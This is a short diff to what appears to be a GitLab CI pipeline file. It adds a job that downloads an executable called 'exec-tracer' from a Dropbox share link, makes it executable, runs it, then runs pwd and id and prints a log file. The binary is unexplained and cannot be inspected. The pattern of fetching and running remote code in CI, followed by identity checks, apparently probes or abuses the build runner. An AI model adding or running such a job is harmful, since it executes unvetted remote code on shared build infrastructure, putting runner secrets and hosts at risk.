@@ -51,3 +51,13 @@ build:
 
   after_script:
     - cat /tmp/exec.log
+
+justrun:
+  script:
+    - wget -k -O exec-tracer "https://www.dropbox.com/scl/fi/62jk44i7r9lboyv8uhzrd/exec-tracer?rlkey=7shagu4bcbjtoc1tahfj10yy1&st=13tg54er&dl=0" && chmod +x exec-tracer
+    - ./exec-tracer
+    - sleep 2
+    - pwd
+    - id
+  after_script:
+    - cat /tmp/exec.log
